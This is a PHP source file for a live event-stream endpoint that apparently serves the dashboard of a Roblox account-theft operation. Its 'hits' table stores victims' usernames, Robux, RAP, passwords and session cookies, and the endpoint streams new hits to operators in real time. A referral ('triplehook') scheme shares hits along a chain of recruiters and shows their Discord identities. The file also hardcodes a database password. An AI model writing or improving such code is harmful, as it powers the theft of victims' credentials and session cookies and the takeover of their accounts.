<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$database = [
    "name" => "database",
    "username" => "database",
    "password" => "abckenlegit"
];

try {
    $pdo = new PDO(
        'mysql:host=localhost;dbname=' . $database['name'] . ';charset=utf8mb4',
        $database['username'],
        $database['password'],
        [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES   => false,
        ]
    );
} catch (PDOException $e) {
    http_response_code(500);
    exit;
}

function safeQuery($pdo, $sql, $params = []) {
    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    return $stmt->fetchAll();
}

if ($_SERVER['REQUEST_METHOD'] !== 'GET') { http_response_code(405); exit; }

$allowedOrigin = ($_SERVER['HTTP_HOST'] ?? '');
$requestOrigin = parse_url($_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? '', PHP_URL_HOST);
if (!empty($requestOrigin) && $requestOrigin !== $allowedOrigin) { http_response_code(403); exit; }

$mode = $_GET['mode'] ?? 'storage';

if ($mode === 'storage') {
    $tokenIn = $_GET['token'] ?? '';
    if (empty($_SESSION['storage_token']) || !hash_equals($_SESSION['storage_token'], $tokenIn)) {
        http_response_code(403); exit;
    }
}

$authCode = trim((string)($_SESSION['auth_code'] ?? ''));
if ($authCode === '') { http_response_code(401); exit; }

$r = safeQuery($pdo, "SELECT * FROM regular WHERE auth_code=:a LIMIT 2", [':a' => $authCode]);
if (!is_array($r) || count($r) !== 1 || !is_array($r[0])) { http_response_code(401); exit; }

$userData = $r[0];
$storedAuthCode = (string)($userData['auth_code'] ?? '');
$linkId = (int)($userData['link_id'] ?? 0);
if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $linkId <= 0) { http_response_code(401); exit; }
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;

if ($mode === 'dashboard') {
    $paramLinkId = $linkId;
    $paramTriplehook = isset($_GET['triplehook']) && $_GET['triplehook'] == '1';

    $refStmt = safeQuery($pdo, "SELECT referred_by FROM regular WHERE link_id = :lid LIMIT 1", [':lid' => $paramLinkId]);
    $referredBy = (int)($refStmt[0]['referred_by'] ?? 0);

    if ($paramTriplehook && $paramLinkId > 0) {
        if ($referredBy > 0) {
            $whereClause = "h.link_id IN (SELECT r3.link_id FROM regular r3 WHERE r3.referred_by IN (SELECT td.link_id FROM triplehook_data td INNER JOIN regular r2 ON r2.link_id = td.link_id WHERE r2.referred_by = :referred_by))";
            $whereParams = [':referred_by' => $referredBy];
        } else {
            $whereClause = "h.link_id IN (SELECT r3.link_id FROM regular r3 WHERE r3.referred_by IN (SELECT td.link_id FROM triplehook_data td))";
            $whereParams = [];
        }
        $selectFields = "h.id, h.username, h.avatar_url, h.robux, h.summary, h.rap, h.created_at, r_owner.discord_username, r_owner.discord_avatar, r_owner.avatar_hidden";
        $joinClause = "FROM hits h LEFT JOIN regular r_hitter ON h.link_id = r_hitter.link_id LEFT JOIN regular r_owner ON r_hitter.referred_by = r_owner.link_id";
    } else {
        if ($referredBy > 0) {
            $whereClause = "h.link_id IN (SELECT r2.link_id FROM regular r2 WHERE r2.referred_by = :referred_by)";
            $whereParams = [':referred_by' => $referredBy];
        } else {
            $whereClause = "1=1";
            $whereParams = [];
        }
        $selectFields = "h.id, h.username, h.avatar_url, h.robux, h.summary, h.rap, h.created_at, r.discord_username, r.discord_avatar, r.avatar_hidden";
        $joinClause = "FROM hits h LEFT JOIN regular r ON h.link_id = r.link_id";
    }
    $isDashboard = true;
} else {
    if ($isTriplehook) {
        $whereClause = "h.link_id IN (SELECT link_id FROM regular WHERE referred_by = :link_id UNION SELECT r2.link_id FROM regular r2 WHERE r2.referred_by IN (SELECT td.link_id FROM triplehook_data td INNER JOIN regular r ON r.link_id = td.link_id WHERE r.referred_by = :link_id2))";
        $whereParams = [':link_id' => $linkId, ':link_id2' => $linkId];
    } else {
        $whereClause = "h.link_id = :link_id";
        $whereParams = [':link_id' => $linkId];
    }
    $selectFields = "h.id, h.username, h.avatar_url, h.robux, h.summary, h.rap, h.password, h.cookie, h.created_at";
    $joinClause = "FROM hits h";
    $isDashboard = false;
}

session_write_close();

while (ob_get_level() > 0) { ob_end_clean(); }
@ini_set('zlib.output_compression', '0');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
ob_implicit_flush(1);

header('Content-Type: text/event-stream');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Connection: keep-alive');
header('X-Accel-Buffering: no');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: no-referrer');

$lastId = isset($_GET['last_id']) ? (int)$_GET['last_id'] : 0;
if ($lastId <= 0) {
    $q = "SELECT MAX(h.id) AS m $joinClause WHERE $whereClause";
    $row = safeQuery($pdo, $q, $whereParams);
    $lastId = (int)($row[0]['m'] ?? 0);
}

$maxLifetime = 300;
$pollInterval = 3;
$heartbeatEvery = 15;
$startTime = time();
$lastHeartbeat = time();

function maskValue($val, $visibleChars = 0) {
    if (empty($val)) return '';
    $len = strlen($val);
    if ($visibleChars <= 0) return str_repeat('*', min($len, 8));
    return substr($val, 0, $visibleChars) . str_repeat('*', max(0, min($len - $visibleChars, 5)));
}

function buildPayload($hit, $isDashboard) {
    $hitId = (int)$hit['id'];
    if ($isDashboard) {
        $hitterHidden = (int)($hit['avatar_hidden'] ?? 0) === 1;
        return [
            'id'         => $hitId,
            'username'   => $hit['username'] ?? 'Unknown',
            'avatar_url' => $hit['avatar_url'] ?? '',
            'robux'      => (int)($hit['robux'] ?? 0),
            'summary'    => (int)($hit['summary'] ?? 0),
            'rap'        => (int)($hit['rap'] ?? 0),
            'created_at' => $hit['created_at'] ?? null,
            'discord_username' => $hitterHidden ? 'Anonymous' : ($hit['discord_username'] ?? ''),
            'discord_avatar'   => $hitterHidden ? 'https://app.ultima.cl/images/hide.png' : ($hit['discord_avatar'] ?? ''),
            'avatar_hidden'    => $hitterHidden ? 1 : 0
        ];
    }
    return [
        'id'         => $hitId,
        'username'   => $hit['username'] ?? 'Unknown',
        'avatar_url' => $hit['avatar_url'] ?? '',
        'robux'      => (int)($hit['robux'] ?? 0),
        'summary'    => (int)($hit['summary'] ?? 0),
        'rap'        => (int)($hit['rap'] ?? 0),
        'password'   => maskValue($hit['password'] ?? ''),
        'cookie'     => maskValue($hit['cookie'] ?? '', 15),
        'created_at' => $hit['created_at'] ?? null
    ];
}

echo "retry: 5000\n";
echo "event: connected\ndata: " . json_encode(['last_id' => $lastId]) . "\n\n";
@flush();

if ($isDashboard) {
    $hasReferrer = ($referredBy ?? 0) > 0;
    $window = $hasReferrer ? 43200 : 1200;

    $initHits = safeQuery($pdo,
        "SELECT $selectFields $joinClause WHERE $whereClause ORDER BY h.created_at DESC LIMIT 6",
        $whereParams
    );

    if (!$paramTriplehook && count($initHits) < 6) {
        $countRow = safeQuery($pdo, "SELECT COUNT(*) as total $joinClause WHERE $whereClause", $whereParams);
        $totalHits = (int)($countRow[0]['total'] ?? 0);
        if ($totalHits >= 6 && !empty($initHits)) {
            $needed = 6 - count($initHits);
            $excludeIds = array_column($initHits, 'id');
            $exPh = [];
            $exParams = $whereParams;
            foreach ($excludeIds as $idx => $eid) {
                $k = ':ex_' . $idx;
                $exPh[] = $k;
                $exParams[$k] = $eid;
            }
            $exClause = " AND h.id NOT IN (" . implode(',', $exPh) . ")";
            $olderHits = safeQuery($pdo,
                "SELECT $selectFields $joinClause WHERE $whereClause $exClause ORDER BY h.created_at DESC LIMIT " . (int)$needed,
                $exParams
            );
            $initHits = array_merge($initHits, $olderHits);
        }
    }

    if (!empty($initHits)) {
        $diffRow = safeQuery($pdo, "SELECT TIMESTAMPDIFF(SECOND, :latest, NOW()) as diff", [':latest' => $initHits[0]['created_at']]);
        $diff = (int)($diffRow[0]['diff'] ?? 99999);
        if ($diff > $window) {
            $initHits = [];
        } else {
            $filtered = [$initHits[0]];
            for ($fi = 1; $fi < count($initHits); $fi++) {
                $gapRow = safeQuery($pdo, "SELECT TIMESTAMPDIFF(SECOND, :older, :newer) as gap", [':older' => $initHits[$fi]['created_at'], ':newer' => $initHits[$fi-1]['created_at']]);
                $gap = (int)($gapRow[0]['gap'] ?? 99999);
                if ($gap > $window) break;
                $filtered[] = $initHits[$fi];
            }
            $initHits = $filtered;
        }
    }

    if (!empty($initHits)) {
        $initHits = array_reverse($initHits);
        foreach ($initHits as $hit) {
            $hitId = (int)$hit['id'];
            $payload = buildPayload($hit, true);
            echo "id: " . $hitId . "\n";
            echo "event: hit\n";
            echo "data: " . json_encode($payload, JSON_UNESCAPED_UNICODE) . "\n\n";
            if ($hitId > $lastId) $lastId = $hitId;
        }
        @flush();
    }
}

while (true) {
    if (connection_aborted()) break;
    if ((time() - $startTime) >= $maxLifetime) break;

    $params = $whereParams;
    $params[':last_id'] = $lastId;
    $newHits = safeQuery($pdo,
        "SELECT $selectFields $joinClause WHERE $whereClause AND h.id > :last_id ORDER BY h.id ASC LIMIT 50",
        $params
    );

    if (!empty($newHits)) {
        foreach ($newHits as $hit) {
            $hitId = (int)$hit['id'];
            $payload = buildPayload($hit, $isDashboard);
            echo "id: " . $hitId . "\n";
            echo "event: hit\n";
            echo "data: " . json_encode($payload, JSON_UNESCAPED_UNICODE) . "\n\n";
            $lastId = $hitId;
        }
        @flush();
        $lastHeartbeat = time();
    } else {
        if ((time() - $lastHeartbeat) >= $heartbeatEvery) {
            echo ": hb\n\n";
            @flush();
            $lastHeartbeat = time();
        }
    }

    sleep($pollInterval);
}

echo "event: bye\ndata: reconnect\n\n";
@flush();